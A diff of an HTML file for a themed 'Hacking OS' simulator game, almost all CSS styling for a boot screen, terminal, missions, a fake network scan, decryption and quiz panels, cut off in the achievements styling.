@@ -2,1415 +2,1595 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-<title>HackingOS v1.0</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HACKING OS — Simulator v2.0</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;600;700&display=swap');
-
-:root {
-  --green: #00ff00;
-  --cyan: #00e5ff;
-  --red: #ff0040;
-  --yellow: #ffcc00;
-  --bg: #000000;
-  --panel-bg: #020a02;
-  --panel-border: #00ff0033;
-  --panel-border-bright: #00ff0088;
-  --text-dim: #00aa00;
-  --overlay: rgba(0,255,0,0.03);
-}
-
-* { margin: 0; padding: 0; box-sizing: border-box; }
-
-html, body {
-  width: 100%; height: 100%;
-  background: var(--bg);
-  font-family: 'Fira Code', 'Courier New', monospace;
-  color: var(--green);
-  overflow: hidden;
-  cursor: crosshair;
-}
-
-/* SCANLINE EFFECT */
-body::before {
-  content: '';
-  position: fixed;
-  inset: 0;
-  background: repeating-linear-gradient(
-    0deg,
-    transparent,
-    transparent 2px,
-    rgba(0,0,0,0.15) 2px,
-    rgba(0,0,0,0.15) 4px
-  );
-  pointer-events: none;
-  z-index: 9999;
-}
-
-/* NOISE OVERLAY */
-body::after {
-  content: '';
-  position: fixed;
-  inset: 0;
-  opacity: 0.02;
-  background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
-  pointer-events: none;
-  z-index: 9998;
-}
-
-/* ═══════════════════════════════
-   BOOT SCREEN
-═══════════════════════════════ */
-#boot-screen {
-  position: fixed;
-  inset: 0;
-  background: #000;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  z-index: 5000;
-  gap: 40px;
-}
-
-.boot-logo {
-  font-size: clamp(28px, 6vw, 72px);
-  font-weight: 700;
-  letter-spacing: 0.3em;
-  color: var(--green);
-  text-shadow: 0 0 20px var(--green), 0 0 40px var(--green), 0 0 80px #00ff0044;
-  animation: glitch-logo 3s infinite;
-  text-align: center;
-}
-
-.boot-sub {
-  font-size: clamp(10px, 2vw, 14px);
-  color: var(--cyan);
-  letter-spacing: 0.5em;
-  text-shadow: 0 0 10px var(--cyan);
-  animation: pulse-text 1.5s infinite;
-}
-
-.boot-loading {
-  width: min(500px, 80vw);
-  display: flex;
-  flex-direction: column;
-  gap: 12px;
-}
-
-.boot-loading-label {
-  display: flex;
-  justify-content: space-between;
-  font-size: 12px;
-  color: var(--text-dim);
-}
-
-.boot-bar-track {
-  width: 100%;
-  height: 6px;
-  background: #001100;
-  border: 1px solid var(--text-dim);
-  position: relative;
-  overflow: hidden;
-}
-
-.boot-bar-fill {
-  height: 100%;
-  width: 0%;
-  background: linear-gradient(90deg, #003300, var(--green), #00ff8844);
-  box-shadow: 0 0 10px var(--green);
-  transition: width 0.1s linear;
-}
-
-.boot-bar-track::after {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(90deg, transparent 70%, rgba(0,255,0,0.3) 100%);
-  animation: bar-shimmer 1s infinite;
-}
-
-.boot-messages {
-  font-size: 11px;
-  color: var(--text-dim);
-  height: 80px;
-  overflow: hidden;
-  width: min(500px, 80vw);
-}
-
-.boot-msg { 
-  animation: fade-in 0.3s ease;
-  line-height: 1.8;
-}
-
-/* ═══════════════════════════════
-   TASKBAR
-═══════════════════════════════ */
-#taskbar {
-  position: fixed;
-  top: 0; left: 0; right: 0;
-  height: 36px;
-  background: linear-gradient(180deg, #001a00 0%, #000d00 100%);
-  border-bottom: 1px solid var(--panel-border-bright);
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 0 16px;
-  z-index: 1000;
-  box-shadow: 0 2px 20px rgba(0,255,0,0.15);
-}
-
-.taskbar-left {
-  font-size: 13px;
-  font-weight: 700;
-  color: var(--green);
-  text-shadow: 0 0 10px var(--green);
-  letter-spacing: 0.1em;
-  animation: glitch-text 8s infinite;
-}
-
-.taskbar-center {
-  font-size: 11px;
-  color: var(--cyan);
-  text-shadow: 0 0 8px var(--cyan);
-  display: flex;
-  align-items: center;
-  gap: 8px;
-}
-
-.status-dot {
-  width: 7px; height: 7px;
-  border-radius: 50%;
-  background: var(--cyan);
-  box-shadow: 0 0 8px var(--cyan);
-  animation: blink-dot 2s infinite;
-}
-
-.taskbar-right {
-  font-size: 13px;
-  color: var(--green);
-  font-weight: 600;
-  text-shadow: 0 0 8px var(--green);
-  min-width: 90px;
-  text-align: right;
-}
-
-/* ═══════════════════════════════
-   MAIN DASHBOARD
-═══════════════════════════════ */
-#dashboard {
-  position: fixed;
-  top: 36px; left: 0; right: 0; bottom: 0;
-  display: grid;
-  grid-template-columns: 280px 1fr 300px;
-  grid-template-rows: 1fr auto;
-  gap: 8px;
-  padding: 8px;
-  background: var(--bg);
-  opacity: 0;
-  pointer-events: none;
-  transition: opacity 0.5s ease;
-}
-
-#dashboard.visible {
-  opacity: 1;
-  pointer-events: all;
-}
-
-/* ═══════════════════════════════
-   PANELS
-═══════════════════════════════ */
-.panel {
-  background: var(--panel-bg);
-  border: 1px solid var(--panel-border);
-  border-radius: 4px;
-  display: flex;
-  flex-direction: column;
-  overflow: hidden;
-  box-shadow: 0 0 20px rgba(0,255,0,0.05), inset 0 0 30px rgba(0,255,0,0.02);
-  transition: border-color 0.3s;
-}
-
-.panel:hover {
-  border-color: var(--panel-border-bright);
-  box-shadow: 0 0 30px rgba(0,255,0,0.1);
-}
-
-.panel-titlebar {
-  background: linear-gradient(180deg, #001f00 0%, #000f00 100%);
-  border-bottom: 1px solid var(--panel-border);
-  padding: 6px 10px;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  flex-shrink: 0;
-}
-
-.panel-title {
-  font-size: 11px;
-  color: var(--cyan);
-  text-shadow: 0 0 6px var(--cyan);
-  letter-spacing: 0.15em;
-  font-weight: 600;
-}
-
-.window-btns {
-  display: flex;
-  gap: 6px;
-}
-
-.wb { 
-  width: 11px; height: 11px;
-  border-radius: 50%;
-  cursor: pointer;
-  transition: all 0.2s;
-  border: 1px solid rgba(255,255,255,0.1);
-}
-.wb:hover { transform: scale(1.2); filter: brightness(1.4); }
-.wb-close { background: #ff5f57; }
-.wb-min { background: #febc2e; }
-.wb-max { background: #28c840; }
-
-.panel-body {
-  flex: 1;
-  overflow: hidden;
-  padding: 10px;
-  position: relative;
-}
-
-/* ═══════════════════════════════
-   LEFT PANEL — SYSTEM STATS
-═══════════════════════════════ */
-.stat-block { margin-bottom: 16px; }
-
-.stat-label {
-  font-size: 10px;
-  color: var(--text-dim);
-  letter-spacing: 0.2em;
-  margin-bottom: 6px;
-  display: flex;
-  justify-content: space-between;
-}
-
-.stat-label span { color: var(--green); }
-
-.stat-bar-track {
-  height: 8px;
-  background: #001100;
-  border: 1px solid #003300;
-  border-radius: 2px;
-  overflow: hidden;
-  position: relative;
-}
-
-.stat-bar-fill {
-  height: 100%;
-  border-radius: 2px;
-  transition: width 0.5s ease;
-  position: relative;
-}
-
-.stat-bar-fill::after {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2));
-  animation: shimmer 2s infinite;
-}
-
-.bar-green { background: linear-gradient(90deg, #003300, var(--green)); box-shadow: 0 0 8px var(--green); }
-.bar-cyan { background: linear-gradient(90deg, #003333, var(--cyan)); box-shadow: 0 0 8px var(--cyan); }
-.bar-yellow { background: linear-gradient(90deg, #333300, var(--yellow)); box-shadow: 0 0 8px var(--yellow); }
-.bar-red { background: linear-gradient(90deg, #330011, var(--red)); box-shadow: 0 0 8px var(--red); }
-
-.mini-stats {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 8px;
-  margin-bottom: 16px;
-}
-
-.mini-stat-box {
-  background: #010f01;
-  border: 1px solid #002200;
-  border-radius: 3px;
-  padding: 8px;
-  text-align: center;
-}
-
-.mini-stat-val {
-  font-size: 16px;
-  font-weight: 700;
-  color: var(--green);
-  text-shadow: 0 0 8px var(--green);
-  display: block;
-}
-
-.mini-stat-lbl {
-  font-size: 9px;
-  color: var(--text-dim);
-  letter-spacing: 0.1em;
-}
-
-/* NETWORK GRAPH */
-#net-graph {
-  width: 100%;
-  height: 80px;
-  margin-top: 4px;
-}
-
-.ip-list {
-  margin-top: 12px;
-  font-size: 10px;
-  color: var(--text-dim);
-  line-height: 2;
-}
-
-.ip-item {
-  display: flex;
-  justify-content: space-between;
-  border-bottom: 1px solid #001500;
-  padding: 2px 0;
-}
-
-.ip-item .status-ok { color: var(--green); }
-.ip-item .status-warn { color: var(--yellow); }
-.ip-item .status-fail { color: var(--red); }
-
-/* ═══════════════════════════════
-   CENTER PANEL — TERMINAL
-═══════════════════════════════ */
-#terminal-output {
-  flex: 1;
-  overflow-y: auto;
-  padding: 10px;
-  font-size: 12px;
-  line-height: 1.7;
-  scroll-behavior: smooth;
-}
-
-#terminal-output::-webkit-scrollbar { width: 4px; }
-#terminal-output::-webkit-scrollbar-track { background: #000; }
-#terminal-output::-webkit-scrollbar-thumb { background: #003300; border-radius: 2px; }
-
-.log-line { display: flex; gap: 8px; word-break: break-all; }
-.log-ts { color: #005500; flex-shrink: 0; }
-.log-info { color: var(--cyan); }
-.log-warn { color: var(--yellow); }
-.log-success { color: var(--green); text-shadow: 0 0 5px var(--green); }
-.log-error { color: var(--red); }
-.log-data { color: #7fff00; }
-.log-sys { color: #888; }
-
-.terminal-input-area {
-  display: flex;
-  align-items: center;
-  padding: 8px 10px;
-  border-top: 1px solid var(--panel-border);
-  background: #000a00;
-  gap: 8px;
-  flex-shrink: 0;
-}
-
-.prompt-text {
-  color: var(--green);
-  font-size: 12px;
-  white-space: nowrap;
-  text-shadow: 0 0 5px var(--green);
-}
-
-#typing-display {
-  color: var(--cyan);
-  font-size: 12px;
-  flex: 1;
-  min-height: 18px;
-}
-
-.cursor-blink {
-  display: inline-block;
-  width: 8px;
-  height: 14px;
-  background: var(--green);
-  animation: blink 0.8s step-end infinite;
-  vertical-align: middle;
-  box-shadow: 0 0 5px var(--green);
-}
-
-/* ═══════════════════════════════
-   RIGHT PANEL — DECRYPT & BYPASS
-═══════════════════════════════ */
-.decrypt-matrix {
-  font-size: 11px;
-  margin-bottom: 16px;
-  font-family: 'Fira Code', monospace;
-}
-
-.decrypt-row {
-  display: flex;
-  gap: 6px;
-  margin-bottom: 4px;
-  align-items: center;
-}
-
-.decrypt-label {
-  color: var(--text-dim);
-  font-size: 10px;
-  width: 80px;
-  flex-shrink: 0;
-}
-
-.decrypt-chars {
-  color: var(--cyan);
-  letter-spacing: 0.1em;
-  font-size: 11px;
-  flex: 1;
-  overflow: hidden;
-  text-shadow: 0 0 4px var(--cyan);
-}
-
-.decrypt-status {
-  font-size: 9px;
-  padding: 1px 5px;
-  border-radius: 2px;
-  flex-shrink: 0;
-}
-
-.ds-cracking { background: #331100; color: var(--yellow); border: 1px solid #664400; }
-.ds-done { background: #001a00; color: var(--green); border: 1px solid #004400; }
-.ds-locked { background: #1a0000; color: var(--red); border: 1px solid #440000; }
-
-.fw-section { margin-top: 16px; }
-
-.fw-row {
-  margin-bottom: 10px;
-}
-
-.fw-label {
-  display: flex;
-  justify-content: space-between;
-  font-size: 10px;
-  color: var(--text-dim);
-  margin-bottom: 4px;
-}
-
-.fw-label .pct { color: var(--cyan); }
-
-/* ACTION BUTTONS */
-.action-btns {
-  grid-column: 1 / -1;
-  display: flex;
-  gap: 8px;
-  flex-wrap: wrap;
-}
-
-.action-btn {
-  flex: 1;
-  min-width: 120px;
-  padding: 10px 16px;
-  background: transparent;
-  border: 1px solid var(--green);
-  color: var(--green);
-  font-family: 'Fira Code', monospace;
-  font-size: 11px;
-  font-weight: 600;
-  letter-spacing: 0.1em;
-  cursor: pointer;
-  text-transform: uppercase;
-  transition: all 0.2s;
-  position: relative;
-  overflow: hidden;
-  border-radius: 3px;
-  text-shadow: 0 0 5px var(--green);
-}
-
-.action-btn::before {
-  content: '';
-  position: absolute;
-  inset: 0;
-  background: var(--green);
-  transform: translateX(-100%);
-  transition: transform 0.2s ease;
-  z-index: 0;
-}
-
-.action-btn:hover::before { transform: translateX(0); }
-.action-btn:hover { color: #000; text-shadow: none; }
-
-.action-btn span { position: relative; z-index: 1; }
-
-.btn-attack { border-color: var(--red); color: var(--red); text-shadow: 0 0 5px var(--red); }
-.btn-attack::before { background: var(--red); }
-.btn-attack:hover { color: #fff; }
-
-.btn-decrypt { border-color: var(--cyan); color: var(--cyan); text-shadow: 0 0 5px var(--cyan); }
-.btn-decrypt::before { background: var(--cyan); }
-
-.btn-clear { border-color: var(--yellow); color: var(--yellow); text-shadow: 0 0 5px var(--yellow); }
-.btn-clear::before { background: var(--yellow); }
-
-/* ═══════════════════════════════
-   POPUP / ALERT
-═══════════════════════════════ */
-#popup-overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.85);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  z-index: 3000;
-  opacity: 0;
-  pointer-events: none;
-  transition: opacity 0.2s;
-}
-
-#popup-overlay.show {
-  opacity: 1;
-  pointer-events: all;
-}
-
-.popup-box {
-  border: 2px solid var(--red);
-  background: #0a0000;
-  padding: 30px 40px;
-  text-align: center;
-  min-width: 300px;
-  max-width: 90vw;
-  box-shadow: 0 0 60px rgba(255,0,64,0.4), inset 0 0 30px rgba(255,0,64,0.05);
-  animation: popup-flicker 0.1s ease;
-}
-
-.popup-box.success-popup {
-  border-color: var(--green);
-  background: #000a00;
-  box-shadow: 0 0 60px rgba(0,255,0,0.4), inset 0 0 30px rgba(0,255,0,0.05);
-}
-
-.popup-icon {
-  font-size: 40px;
-  margin-bottom: 12px;
-  display: block;
-  animation: spin-icon 0.5s ease;
-}
-
-.popup-title {
-  font-size: 22px;
-  font-weight: 700;
-  letter-spacing: 0.2em;
-  margin-bottom: 10px;
-  text-shadow: 0 0 20px currentColor;
-}
-
-.popup-msg {
-  font-size: 11px;
-  color: var(--text-dim);
-  line-height: 1.8;
-  margin-bottom: 20px;
-}
-
-.popup-close {
-  background: transparent;
-  border: 1px solid currentColor;
-  color: inherit;
-  font-family: 'Fira Code', monospace;
-  font-size: 11px;
-  padding: 8px 24px;
-  cursor: pointer;
-  letter-spacing: 0.2em;
-  transition: all 0.2s;
-}
-
-.popup-close:hover { background: currentColor; color: #000; }
-
-/* ═══════════════════════════════
-   MATRIX RAIN BACKGROUND
-═══════════════════════════════ */
-#matrix-canvas {
-  position: fixed;
-  inset: 0;
-  opacity: 0.04;
-  pointer-events: none;
-  z-index: 0;
-}
-
-/* ═══════════════════════════════
-   ANIMATIONS
-═══════════════════════════════ */
-@keyframes glitch-logo {
-  0%, 92%, 100% { 
-    text-shadow: 0 0 20px var(--green), 0 0 40px var(--green), 0 0 80px #00ff0044;
-    transform: translate(0);
-    clip-path: none;
+  :root {
+    --neon: #00ff41;
+    --neon2: #00d4ff;
+    --neon3: #ff0080;
+    --dark: #000a00;
+    --dark2: #001100;
+    --dark3: #0a0a0a;
+    --card: rgba(0,255,65,0.05);
+    --border: rgba(0,255,65,0.2);
+    --text: #00ff41;
+    --text-dim: rgba(0,255,65,0.5);
+    --glow: 0 0 10px #00ff41, 0 0 20px #00ff41, 0 0 40px rgba(0,255,65,0.3);
+    --glow2: 0 0 10px #00d4ff, 0 0 20px #00d4ff;
   }
-  93% { 
-    text-shadow: -3px 0 var(--red), 3px 0 var(--cyan);
-    transform: translate(-2px, 1px) skewX(-5deg);
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    background:#000;
+    color:var(--neon);
+    font-family:'Courier New',monospace;
+    min-height:100vh;
+    overflow-x:hidden;
   }
-  94% { 
-    text-shadow: 2px 0 var(--red), -2px 0 var(--cyan);
-    transform: translate(2px, -1px);
+  ::-webkit-scrollbar{width:4px;}
+  ::-webkit-scrollbar-track{background:#000;}
+  ::-webkit-scrollbar-thumb{background:var(--neon);border-radius:2px;}
+
+  /* ===== BOOT SCREEN ===== */
+  #boot{
+    position:fixed;inset:0;background:#000;
+    z-index:9999;display:flex;flex-direction:column;
+    align-items:center;justify-content:center;
+    transition:opacity 0.8s;
   }
-  95% {
-    text-shadow: 0 0 20px var(--green);
-    transform: translate(0);
+  #boot.hidden{opacity:0;pointer-events:none;}
+  .boot-logo{
+    font-size:clamp(28px,6vw,60px);
+    font-weight:900;letter-spacing:8px;
+    text-shadow:var(--glow);
+    animation:pulse 1s infinite;
+    text-align:center;
   }
-}
+  .boot-sub{color:var(--neon2);font-size:clamp(10px,2vw,14px);letter-spacing:4px;margin-top:10px;}
+  .boot-bar-wrap{width:min(400px,80vw);margin-top:40px;}
+  .boot-bar-label{font-size:11px;color:var(--text-dim);margin-bottom:6px;display:flex;justify-content:space-between;}
+  .boot-bar{height:3px;background:rgba(0,255,65,0.1);border:1px solid var(--border);border-radius:2px;overflow:hidden;}
+  .boot-bar-fill{height:100%;width:0%;background:var(--neon);box-shadow:var(--glow);transition:width 0.05s;}
+  .boot-log{margin-top:20px;width:min(400px,80vw);height:120px;overflow:hidden;font-size:10px;color:var(--text-dim);}
+  .boot-log-line{padding:1px 0;animation:fadeIn 0.2s;}
 
-@keyframes glitch-text {
-  0%, 95%, 100% { 
-    text-shadow: 0 0 10px var(--green);
-    transform: translate(0);
+  /* ===== MATRIX CANVAS ===== */
+  #matrix{position:fixed;top:0;left:0;z-index:0;opacity:0.12;pointer-events:none;}
+
+  /* ===== MAIN APP ===== */
+  #app{position:relative;z-index:1;min-height:100vh;display:none;}
+
+  /* ===== TOPBAR ===== */
+  .topbar{
+    position:sticky;top:0;z-index:100;
+    background:rgba(0,10,0,0.95);
+    backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--border);
+    padding:8px 16px;
+    display:flex;align-items:center;justify-content:space-between;
+    flex-wrap:wrap;gap:8px;
   }
-  96% { transform: translate(-1px, 0); text-shadow: 1px 0 var(--red); }
-  97% { transform: translate(1px, 0); text-shadow: -1px 0 var(--cyan); }
-  98% { transform: translate(0); }
-}
-
-@keyframes pulse-text {
-  0%, 100% { opacity: 1; }
-  50% { opacity: 0.5; }
-}
-
-@keyframes blink {
-  0%, 100% { opacity: 1; }
-  50% { opacity: 0; }
-}
-
-@keyframes blink-dot {
-  0%, 100% { opacity: 1; box-shadow: 0 0 8px var(--cyan); }
-  50% { opacity: 0.3; box-shadow: none; }
-}
-
-@keyframes shimmer {
-  0% { transform: translateX(-100%); }
-  100% { transform: translateX(200%); }
-}
-
-@keyframes bar-shimmer {
-  0% { opacity: 0; transform: translateX(-100%); }
-  50% { opacity: 1; }
-  100% { opacity: 0; transform: translateX(100%); }
-}
-
-@keyframes fade-in {
-  from { opacity: 0; transform: translateY(4px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-@keyframes spin-icon {
-  from { transform: scale(0) rotate(-180deg); }
-  to { transform: scale(1) rotate(0deg); }
-}
-
-@keyframes popup-flicker {
-  0% { opacity: 0; transform: scale(0.9); }
-  50% { opacity: 1; transform: scale(1.02); }
-  100% { transform: scale(1); }
-}
-
-@keyframes flash-screen {
-  0%, 100% { background: transparent; }
-  50% { background: rgba(255, 0, 64, 0.05); }
-}
-
-/* ═══════════════════════════════
-   RESPONSIVE
-═══════════════════════════════ */
-@media (max-width: 900px) {
-  #dashboard {
-    grid-template-columns: 1fr;
-    grid-template-rows: auto auto auto auto;
-    overflow-y: auto;
-    gap: 6px;
+  .topbar-brand{
+    font-size:clamp(14px,3vw,20px);font-weight:900;
+    letter-spacing:4px;text-shadow:var(--glow);
+  }
+  .topbar-right{display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+  .topbar-time{font-size:11px;color:var(--neon2);letter-spacing:2px;}
+  .sound-btn{
+    background:transparent;border:1px solid var(--border);
+    color:var(--neon);padding:4px 10px;font-family:inherit;
+    font-size:10px;cursor:pointer;letter-spacing:2px;
+    transition:all 0.3s;border-radius:2px;
+  }
+  .sound-btn:hover{background:var(--card);box-shadow:var(--glow);}
+  .status-dot{
+    width:8px;height:8px;border-radius:50%;
+    background:var(--neon);box-shadow:var(--glow);
+    animation:blink 1s infinite;
   }
 
-  .panel { min-height: 220px; max-height: 280px; }
-  #center-panel { min-height: 300px; max-height: 350px; }
-  .action-btns { grid-column: 1 / -1; }
+  /* ===== NAV TABS ===== */
+  .nav-tabs{
+    display:flex;gap:4px;padding:8px 16px;
+    background:rgba(0,5,0,0.8);
+    border-bottom:1px solid var(--border);
+    overflow-x:auto;
+    scrollbar-width:none;
+  }
+  .nav-tabs::-webkit-scrollbar{display:none;}
+  .tab-btn{
+    background:transparent;
+    border:1px solid var(--border);
+    color:var(--text-dim);
+    padding:6px 14px;
+    font-family:inherit;font-size:10px;
+    letter-spacing:2px;cursor:pointer;
+    transition:all 0.3s;white-space:nowrap;
+    border-radius:2px;
+  }
+  .tab-btn.active,.tab-btn:hover{
+    background:var(--card);
+    color:var(--neon);
+    border-color:var(--neon);
+    box-shadow:0 0 8px rgba(0,255,65,0.3);
+  }
 
-  .taskbar-center { display: none; }
-  .taskbar-left { font-size: 11px; }
-}
+  /* ===== PANELS ===== */
+  .panel{display:none;padding:16px;animation:fadeIn 0.4s;}
+  .panel.active{display:block;}
 
-@media (max-width: 600px) {
-  #taskbar { padding: 0 10px; }
-  .action-btn { font-size: 10px; padding: 8px 10px; min-width: 90px; }
-  .panel-title { font-size: 10px; }
-}
+  /* ===== GRID LAYOUTS ===== */
+  .grid-2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px;}
+  .grid-3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;}
+
+  /* ===== CARD ===== */
+  .card{
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:4px;padding:16px;
+    position:relative;overflow:hidden;
+  }
+  .card::before{
+    content:'';position:absolute;top:0;left:0;right:0;height:1px;
+    background:linear-gradient(90deg,transparent,var(--neon),transparent);
+  }
+  .card-title{
+    font-size:11px;letter-spacing:3px;
+    color:var(--neon2);margin-bottom:12px;
+    display:flex;align-items:center;gap:8px;
+  }
+  .card-title::before{content:'▶';font-size:8px;color:var(--neon);}
+
+  /* ===== PROFILE CARD ===== */
+  .profile-avatar{
+    width:80px;height:80px;border-radius:50%;
+    border:2px solid var(--neon);
+    background:var(--dark2);
+    display:flex;align-items:center;justify-content:center;
+    font-size:32px;margin-bottom:12px;
+    box-shadow:var(--glow);
+    position:relative;
+  }
+  .profile-avatar::after{
+    content:'';position:absolute;inset:-4px;
+    border-radius:50%;
+    border:1px solid rgba(0,255,65,0.3);
+    animation:spin 4s linear infinite;
+    border-top-color:var(--neon);
+  }
+  .profile-name{font-size:20px;font-weight:900;letter-spacing:3px;text-shadow:var(--glow);}
+  .profile-rank{
+    display:inline-block;padding:3px 10px;
+    border:1px solid var(--neon3);color:var(--neon3);
+    font-size:10px;letter-spacing:3px;margin-top:6px;
+    box-shadow:0 0 8px rgba(255,0,128,0.3);
+  }
+  .stat-row{display:flex;justify-content:space-between;align-items:center;margin:8px 0;font-size:12px;}
+  .stat-label{color:var(--text-dim);}
+  .stat-val{color:var(--neon);font-weight:bold;}
+  .xp-bar-wrap{margin-top:12px;}
+  .xp-bar{height:4px;background:rgba(0,255,65,0.1);border-radius:2px;overflow:hidden;margin-top:4px;}
+  .xp-fill{height:100%;background:linear-gradient(90deg,var(--neon),var(--neon2));border-radius:2px;transition:width 1s;}
+  .xp-label{display:flex;justify-content:space-between;font-size:10px;color:var(--text-dim);margin-bottom:4px;}
+
+  /* ===== TERMINAL ===== */
+  .terminal{
+    background:#000;border:1px solid var(--border);
+    border-radius:4px;overflow:hidden;
+    font-family:'Courier New',monospace;
+  }
+  .terminal-bar{
+    background:rgba(0,255,65,0.08);
+    padding:6px 12px;font-size:10px;
+    display:flex;align-items:center;gap:8px;
+    border-bottom:1px solid var(--border);
+  }
+  .t-dot{width:8px;height:8px;border-radius:50%;}
+  .t-dot.r{background:#ff5f56;}
+  .t-dot.y{background:#ffbd2e;}
+  .t-dot.g{background:#27c93f;}
+  .terminal-body{padding:12px;min-height:220px;max-height:320px;overflow-y:auto;font-size:12px;line-height:1.8;}
+  .t-line{margin:1px 0;}
+  .t-prompt{color:var(--neon2);}
+  .t-cmd{color:var(--neon);}
+  .t-out{color:rgba(0,255,65,0.7);}
+  .t-err{color:#ff5f56;}
+  .t-info{color:var(--neon2);}
+  .terminal-input-row{
+    display:flex;align-items:center;gap:8px;
+    padding:8px 12px;border-top:1px solid var(--border);
+    background:rgba(0,255,65,0.03);
+  }
+  .t-cursor{color:var(--neon2);}
+  .terminal-input{
+    flex:1;background:transparent;border:none;
+    color:var(--neon);font-family:inherit;font-size:12px;
+    outline:none;caret-color:var(--neon);
+  }
+
+  /* ===== MISSIONS ===== */
+  .mission-item{
+    border:1px solid var(--border);padding:12px;
+    border-radius:4px;margin-bottom:10px;
+    cursor:pointer;transition:all 0.3s;
+    position:relative;overflow:hidden;
+  }
+  .mission-item:hover{background:var(--card);border-color:var(--neon);}
+  .mission-item.completed{border-color:rgba(0,255,65,0.4);opacity:0.6;}
+  .mission-item.completed::after{
+    content:'✓ COMPLETED';position:absolute;right:12px;top:50%;
+    transform:translateY(-50%);color:var(--neon);font-size:10px;letter-spacing:2px;
+  }
+  .mission-title{font-size:13px;font-weight:bold;margin-bottom:4px;}
+  .mission-desc{font-size:11px;color:var(--text-dim);}
+  .mission-reward{
+    display:inline-block;margin-top:6px;padding:2px 8px;
+    border:1px solid var(--neon2);color:var(--neon2);font-size:10px;
+  }
+  .mission-diff{
+    display:inline-block;padding:2px 8px;
+    font-size:10px;margin-left:6px;border:1px solid;
+  }
+  .diff-easy{color:#00ff41;border-color:#00ff41;}
+  .diff-medium{color:#ffbd2e;border-color:#ffbd2e;}
+  .diff-hard{color:#ff5f56;border-color:#ff5f56;}
+  .mission-btn{
+    background:transparent;border:1px solid var(--neon);
+    color:var(--neon);padding:5px 14px;font-family:inherit;
+    font-size:10px;cursor:pointer;letter-spacing:2px;
+    margin-top:8px;transition:all 0.3s;
+  }
+  .mission-btn:hover{background:var(--neon);color:#000;}
+  .mission-btn:disabled{opacity:0.4;cursor:not-allowed;}
+
+  /* ===== NETWORK SCAN ===== */
+  .scan-output{
+    background:#000;border:1px solid var(--border);
+    padding:12px;min-height:180px;font-size:11px;
+    line-height:1.9;max-height:280px;overflow-y:auto;
+    border-radius:4px;
+  }
+  .scan-line{animation:fadeIn 0.3s;}
+  .scan-ip{color:var(--neon2);}
+  .scan-port-open{color:var(--neon);}
+  .scan-port-closed{color:rgba(255,95,86,0.6);}
+  .scan-btn{
+    background:transparent;border:1px solid var(--neon2);
+    color:var(--neon2);padding:8px 20px;font-family:inherit;
+    font-size:11px;cursor:pointer;letter-spacing:3px;
+    transition:all 0.3s;margin-top:12px;display:block;width:100%;
+  }
+  .scan-btn:hover{background:rgba(0,212,255,0.1);box-shadow:var(--glow2);}
+  .scan-btn:disabled{opacity:0.4;cursor:not-allowed;}
+
+  /* ===== DECRYPT ===== */
+  .decrypt-display{
+    background:#000;border:1px solid var(--neon3);
+    padding:16px;font-size:14px;letter-spacing:4px;
+    text-align:center;margin:12px 0;min-height:60px;
+    display:flex;align-items:center;justify-content:center;
+    border-radius:4px;font-weight:bold;
+    box-shadow:0 0 10px rgba(255,0,128,0.1);
+  }
+  .decrypt-progress{
+    height:4px;background:rgba(255,0,128,0.1);
+    border-radius:2px;overflow:hidden;margin:8px 0;
+  }
+  .decrypt-fill{
+    height:100%;width:0%;
+    background:linear-gradient(90deg,var(--neon3),var(--neon2));
+    transition:width 0.1s;
+  }
+  .decrypt-btn{
+    background:transparent;border:1px solid var(--neon3);
+    color:var(--neon3);padding:8px 20px;font-family:inherit;
+    font-size:11px;cursor:pointer;letter-spacing:3px;
+    transition:all 0.3s;margin-top:8px;display:block;width:100%;
+  }
+  .decrypt-btn:hover{background:rgba(255,0,128,0.1);}
+  .decrypt-btn:disabled{opacity:0.4;cursor:not-allowed;}
+
+  /* ===== QUIZ ===== */
+  .quiz-q{font-size:14px;line-height:1.6;margin-bottom:16px;color:var(--neon2);}
+  .quiz-options{display:flex;flex-direction:column;gap:8px;}
+  .quiz-opt{
+    background:transparent;border:1px solid var(--border);
+    color:var(--text);padding:10px 14px;font-family:inherit;
+    font-size:12px;cursor:pointer;text-align:left;
+    transition:all 0.3s;border-radius:2px;
+  }
+  .quiz-opt:hover:not(:disabled){background:var(--card);border-color:var(--neon);}
+  .quiz-opt.correct{border-color:var(--neon);background:rgba(0,255,65,0.1);color:var(--neon);}
+  .quiz-opt.wrong{border-color:#ff5f56;background:rgba(255,95,86,0.1);color:#ff5f56;}
+  .quiz-feedback{margin-top:12px;font-size:12px;min-height:20px;}
+  .quiz-score{text-align:center;font-size:24px;font-weight:bold;text-shadow:var(--glow);}
+  .quiz-next-btn{
+    background:transparent;border:1px solid var(--neon);
+    color:var(--neon);padding:8px 20px;font-family:inherit;
+    font-size:11px;cursor:pointer;letter-spacing:3px;
+    transition:all 0.3s;margin-top:12px;width:100%;
+  }
+  .quiz-next-btn:hover{background:var(--card);}
+
+  /* ===== ACHIEVEMENTS ===== */
+  .ach-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px;}
+  .ach-item{
+    border:1px solid var(--border);padding:12px;
